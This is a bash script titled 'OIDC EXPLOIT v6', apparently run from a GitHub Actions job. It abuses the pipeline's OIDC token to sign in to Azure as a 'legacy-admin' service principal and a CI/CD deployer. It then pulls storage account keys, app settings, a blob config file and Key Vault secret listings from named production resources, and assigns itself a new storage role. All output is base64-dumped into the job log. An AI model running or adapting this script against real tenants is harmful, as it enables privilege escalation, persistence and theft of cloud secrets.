#!/bin/bash
set -uo pipefail

echo "=== OIDC EXPLOIT v6 - LEGACY-ADMIN OIDC ==="

T="${AZURE_TENANT_ID}"
SUB="${AZURE_SUBSCRIPTION_ID}"

# === PART A: Auth as LEGACY-ADMIN via OIDC ===
# legacy-admin has FIC (base-pipe) matching upstream PR subject
LA_CID="891fb158-e02c-4428-a885-53b811f369c0"

OIDC=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | jq -r '.value')
echo "oidc_len=${#OIDC}"

# Decode OIDC subject for debugging
echo "=== OIDC SUBJECT ==="
echo "$OIDC" | cut -d. -f2 | python3 -c "
import sys,base64,json
p=sys.stdin.read().strip()+'=='
d=json.loads(base64.b64decode(p))
print('sub:',d.get('sub',''))
print('aud:',d.get('aud',''))
print('iss:',d.get('iss',''))
print('repo:',d.get('repository',''))
" 2>/dev/null || true

# ARM token as legacy-admin
echo "=== LEGACY-ADMIN ARM ==="
LA_ARM_RESP=$(curl -sS -X POST "https://login.microsoftonline.com/$T/oauth2/v2.0/token" \
  -d "grant_type=client_credentials" \
  -d "client_id=$LA_CID" \
  -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
  -d "client_assertion=$OIDC" \
  -d "scope=https://management.azure.com/.default" 2>&1)
LA_ARM=$(echo "$LA_ARM_RESP" | jq -r '.access_token // empty')
echo "la_arm_len=${#LA_ARM}"
[ -z "$LA_ARM" ] && echo "LA_ARM_ERR=$(echo "$LA_ARM_RESP" | jq -r '.error_description // empty' | head -c 200)"

if [ -n "$LA_ARM" ]; then
  echo "=== LA ARM CLAIMS ==="
  echo "$LA_ARM" | cut -d. -f2 | python3 -c "
import sys,base64,json
p=sys.stdin.read().strip()+'=='
d=json.loads(base64.b64decode(p))
for k in ('aud','appid','oid','roles','wids','scp'):
    if k in d: print(f'{k}: {d[k]}')
" 2>/dev/null || true

  # What can legacy-admin see?
  echo "=== LA SUBSCRIPTIONS ==="
  curl -sS -H "Authorization: Bearer $LA_ARM" \
    "https://management.azure.com/subscriptions?api-version=2022-12-01" | base64 -w0
  echo ""

  echo "=== LA ROLE ASSIGNMENTS ==="
  curl -sS -H "Authorization: Bearer $LA_ARM" \
    "https://management.azure.com/subscriptions/$SUB/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01" | base64 -w0
  echo ""

  echo "=== LA STORAGE LISTKEYS ==="
  curl -sS -X POST -H "Authorization: Bearer $LA_ARM" -H "Content-Type: application/json" -H "Content-Length: 0" \
    "https://management.azure.com/subscriptions/$SUB/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Storage/storageAccounts/sttblappcfgprodx3euoz/listKeys?api-version=2023-01-01" | base64 -w0
  echo ""

  echo "=== LA REPORTING APPSETTINGS ==="
  curl -sS -X POST -H "Authorization: Bearer $LA_ARM" -H "Content-Length: 0" \
    "https://management.azure.com/subscriptions/$SUB/resourceGroups/rg-tbl-reporting-prod-eus/providers/Microsoft.Web/sites/app-tbl-reporting-prod/config/appsettings/list?api-version=2022-03-01" | base64 -w0
  echo ""

  echo "=== LA ALL RESOURCES ==="
  curl -sS -H "Authorization: Bearer $LA_ARM" \
    "https://management.azure.com/subscriptions/$SUB/resources?api-version=2021-04-01" | base64 -w0
  echo ""

  echo "=== LA CREATE ROLE ASSIGNMENT ==="
  ASSIGN_ID=$(python3 -c "import uuid;print(uuid.uuid4())")
  # Try adding Storage Blob Data Reader for LA SP on appcfg storage
  LA_OID=$(echo "$LA_ARM" | cut -d. -f2 | python3 -c "import sys,base64,json;p=sys.stdin.read().strip()+'==';print(json.loads(base64.b64decode(p)).get('oid',''))" 2>/dev/null)
  curl -sS -X PUT -H "Authorization: Bearer $LA_ARM" -H "Content-Type: application/json" \
    "https://management.azure.com/subscriptions/$SUB/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Storage/storageAccounts/sttblappcfgprodx3euoz/providers/Microsoft.Authorization/roleAssignments/$ASSIGN_ID?api-version=2022-04-01" \
    -d "{\"properties\":{\"roleDefinitionId\":\"/subscriptions/$SUB/providers/Microsoft.Authorization/roleDefinitions/2a2b9908-6ea1-4ae2-8e65-a410df84e7d1\",\"principalId\":\"$LA_OID\",\"principalType\":\"ServicePrincipal\"}}" | base64 -w0
  echo ""
fi

# Storage token as legacy-admin
OIDC2=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | jq -r '.value')
echo "=== LEGACY-ADMIN STORAGE ==="
LA_ST_RESP=$(curl -sS -X POST "https://login.microsoftonline.com/$T/oauth2/v2.0/token" \
  -d "grant_type=client_credentials" \
  -d "client_id=$LA_CID" \
  -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
  -d "client_assertion=$OIDC2" \
  -d "scope=https://storage.azure.com/.default")
LA_ST=$(echo "$LA_ST_RESP" | jq -r '.access_token // empty')
echo "la_st_len=${#LA_ST}"
[ -z "$LA_ST" ] && echo "LA_ST_ERR=$(echo "$LA_ST_RESP" | jq -r '.error_description // empty' | head -c 200)"

if [ -n "$LA_ST" ]; then
  echo "=== LA BLOB READ ==="
  curl -sS -H "Authorization: Bearer $LA_ST" -H "x-ms-version: 2021-08-06" \
    "https://sttblappcfgprodx3euoz.blob.core.windows.net/config/internal-config.json" | base64 -w0
  echo ""
fi

# KV token as legacy-admin
OIDC3=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | jq -r '.value')
echo "=== LEGACY-ADMIN KV ==="
LA_KV_RESP=$(curl -sS -X POST "https://login.microsoftonline.com/$T/oauth2/v2.0/token" \
  -d "grant_type=client_credentials" \
  -d "client_id=$LA_CID" \
  -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
  -d "client_assertion=$OIDC3" \
  -d "scope=https://vault.azure.net/.default")
LA_KV=$(echo "$LA_KV_RESP" | jq -r '.access_token // empty')
echo "la_kv_len=${#LA_KV}"

if [ -n "$LA_KV" ]; then
  echo "=== LA KV-SEC SECRETS ==="
  curl -sS -H "Authorization: Bearer $LA_KV" \
    "https://kv-tbl-sec-x3euoz.vault.azure.net/secrets?api-version=7.4" | base64 -w0
  echo ""

  echo "=== LA KV-PROD SECRETS ==="
  curl -sS -H "Authorization: Bearer $LA_KV" \
    "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets?api-version=7.4" | base64 -w0
  echo ""
fi

# === PART B: Also try cicd-deployer for v5 queries ===
CID="${AZURE_CLIENT_ID}"
OIDC4=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | jq -r '.value')
ARM=$(curl -sS -X POST "https://login.microsoftonline.com/$T/oauth2/v2.0/token" \
  -d "grant_type=client_credentials" -d "client_id=$CID" \
  -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
  -d "client_assertion=$OIDC4" \
  -d "scope=https://management.azure.com/.default" | jq -r '.access_token // empty')
echo "cicd_arm_len=${#ARM}"

echo "=== CICD ALL RESOURCES ==="
curl -sS -H "Authorization: Bearer $ARM" \
  "https://management.azure.com/subscriptions/$SUB/resources?api-version=2021-04-01" | base64 -w0
echo ""

echo "=== CICD RESOURCE GROUPS ==="
curl -sS -H "Authorization: Bearer $ARM" \
  "https://management.azure.com/subscriptions/$SUB/resourcegroups?api-version=2021-04-01" | base64 -w0
echo ""

echo "=== CICD STORAGE PROPS ==="
curl -sS -H "Authorization: Bearer $ARM" \
  "https://management.azure.com/subscriptions/$SUB/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Storage/storageAccounts/sttblappcfgprodx3euoz?api-version=2023-01-01" | base64 -w0
echo ""

echo ""
echo "=== DONE v6 ==="
